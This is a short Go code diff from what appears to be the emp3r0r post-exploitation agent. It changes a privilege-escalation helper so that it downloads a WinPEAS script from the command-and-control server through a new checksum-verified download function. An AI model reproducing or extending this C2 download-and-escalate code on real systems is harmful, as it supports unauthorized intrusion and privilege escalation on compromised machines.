@@ -11,14 +11,14 @@ import (
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 )
 
-func runLPEHelper(method string) (out string) {
+func runLPEHelper(method, checksum string) (out string) {
 	if !strings.HasPrefix(method, "lpe_winpeas") {
 		return "Only lpe_winpeas* is supported for now"
 	}
 
 	log.Printf("Downloading LPE script from %s", emp3r0r_data.CCAddress+method)
 	var scriptData []byte
-	scriptData, err := DownloadViaCC(method, "")
+	scriptData, err := SmartDownload(method, "", checksum)
 	if err != nil {
 		return "Download error: " + err.Error()
 	}
